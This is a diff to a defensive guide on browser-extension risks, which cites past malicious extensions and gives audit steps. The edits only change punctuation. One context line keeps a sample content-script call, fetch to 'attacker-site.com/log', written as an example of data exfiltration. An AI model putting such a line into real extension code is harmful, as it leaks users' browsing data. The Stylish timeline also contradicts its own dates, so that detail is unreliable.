@@ -30,7 +30,7 @@ Table of Contents
 - [Alternatives to Common High-Permission Extensions](#alternatives-to-common-high-permission-extensions)
 - [Isolating Extensions](#isolating-extensions)
 - [Auditing Extensions Before Installation](#auditing-extensions-before-installation)
-- [Extension Compromise Timeline: Real Examples](#extension-compromise-timeline-real-examples)
+- [Extension Compromise Timeline - Real Examples](#extension-compromise-timeline-real-examples)
 - [Building an Extension Allowlist](#building-an-extension-allowlist)
 - [Manifest V3 Extensions to Avoid](#manifest-v3-extensions-to-avoid)
 - [Enterprise Extension Policies](#enterprise-extension-policies)
@@ -80,13 +80,13 @@ Most malicious extensions were not malicious when first published. They follow a
 
 This pattern has played out repeatedly:
 
-Web of Trust (WOT), 2016: 140 million users. After investigation by German TV, it was found to collect and sell browsing history, including visits to health sites, banking URLs, and other sensitive categories. all supposedly anonymized but easily re-identified.
+Web of Trust (WOT), 2016 - 140 million users. After investigation by German TV, it was found to collect and sell browsing history, including visits to health sites, banking URLs, and other sensitive categories. all supposedly anonymized but easily re-identified.
 
-Stylish, 2018: 2 million users. Collected every URL visited by users, along with personally identifiable information from logged-in sessions. Was removed from stores after a security researcher published the analysis.
+Stylish, 2018 - 2 million users. Collected every URL visited by users, along with personally identifiable information from logged-in sessions. Was removed from stores after a security researcher published the analysis.
 
-The Great Suspender, 2021: 2 million users. Sold to an unknown buyer who added malware. Google removed it from the Chrome Web Store and forcibly disabled it from all users' browsers.
+The Great Suspender, 2021 - 2 million users. Sold to an unknown buyer who added malware. Google removed it from the Chrome Web Store and forcibly disabled it from all users' browsers.
 
-DataSpii, 2019: A security researcher discovered that multiple popular extensions were exfiltrating browsing history at scale. combined, the affected extensions had hundreds of millions of users. The stolen data included private links to Google Drive documents, corporate internal tools, and medical record portals.
+DataSpii, 2019 - A security researcher discovered that multiple popular extensions were exfiltrating browsing history at scale. combined, the affected extensions had hundreds of millions of users. The stolen data included private links to Google Drive documents, corporate internal tools, and medical record portals.
 
 These are the documented cases. Extensions are not systematically audited on an ongoing basis; undiscovered surveillance operations are almost certainly ongoing.
 
@@ -156,11 +156,11 @@ Isolating Extensions
 
 If you must use an extension you don't fully trust:
 
-Chrome: Use Chrome Profiles to isolate extensions. Create a separate profile for sensitive browsing with no extensions, and keep your extension-heavy profile for general use.
+Chrome - Use Chrome Profiles to isolate extensions. Create a separate profile for sensitive browsing with no extensions, and keep your extension-heavy profile for general use.
 
-Firefox: Use Multi-Account Containers. Extensions can be scoped to containers, though this requires careful setup.
+Firefox - Use Multi-Account Containers. Extensions can be scoped to containers, though this requires careful setup.
 
-Dedicated browser instance: Run a second browser (e.g., LibreWolf) with no extensions for banking and healthcare sites. Use your extension-equipped browser for general web browsing.
+Dedicated browser instance - Run a second browser (e.g., LibreWolf) with no extensions for banking and healthcare sites. Use your extension-equipped browser for general web browsing.
 
 ```bash
 Launch a separate Chrome instance with a clean profile (no extensions)
@@ -176,13 +176,13 @@ Auditing Extensions Before Installation
 
 Before installing any extension, conduct this audit:
 
-Step 1: Check Developer Reputation
+Step 1 - Check Developer Reputation
 - Who published this extension? Search for "[extension name] security incident" or "[developer name] scam"
 - Does the developer have other extensions? Legitimate developers maintain multiple tools
 - When was the last update? Extensions inactive for 6+ months are higher risk
 - How many users? More users mean more visibility to security researchers (not foolproof, but relevant)
 
-Step 2: Review Requested Permissions
+Step 2 - Review Requested Permissions
 ```bash
 For Chrome, inspect the manifest.json of any extension
 Permission requests appear in manifest.json under "permissions"
@@ -195,7 +195,7 @@ Examples:
 "permissions": ["activeTab"]   # LOWER - only active during use
 ```
 
-Step 3: Check for Suspicious Content Scripts
+Step 3 - Check for Suspicious Content Scripts
 Extensions inject content scripts into pages you visit. Examine what the script actually does:
 
 ```javascript
@@ -214,7 +214,7 @@ fetch('https://attacker-site.com/log', {
 
 A legitimate extension only sends necessary data to its own servers.
 
-Step 4: Use VirusTotal for Quick Scanning
+Step 4 - Use VirusTotal for Quick Scanning
 For Chrome extensions, you can download the .crx file and scan it:
 
 ```bash
@@ -225,7 +225,7 @@ curl -X POST https://www.virustotal.com/api/v3/files \
   -F file=@extension.crx
 ```
 
-Extension Compromise Timeline: Real Examples
+Extension Compromise Timeline - Real Examples
 
 Understanding how compromises happen helps you spot warning signs:
 
@@ -237,7 +237,7 @@ The Great Suspender Timeline (2018-2021):
 5. May 2021 - Google forcibly removes from all users' browsers
 6. Timeline: 3+ years of trust before compromise
 
-Lesson: Watch for ownership changes
+Lesson - Watch for ownership changes
 
 Stylish Timeline (2016-2018):
 1. 2016 - Extends to 2 million users
@@ -246,7 +246,7 @@ Stylish Timeline (2016-2018):
 4. May 2019 - Removed from Chrome Web Store
 5. Timeline: 2 years of hidden tracking
 
-Lesson: High user count and good ratings don't guarantee safety
+Lesson - High user count and good ratings don't guarantee safety
 
 Building an Extension Allowlist
 
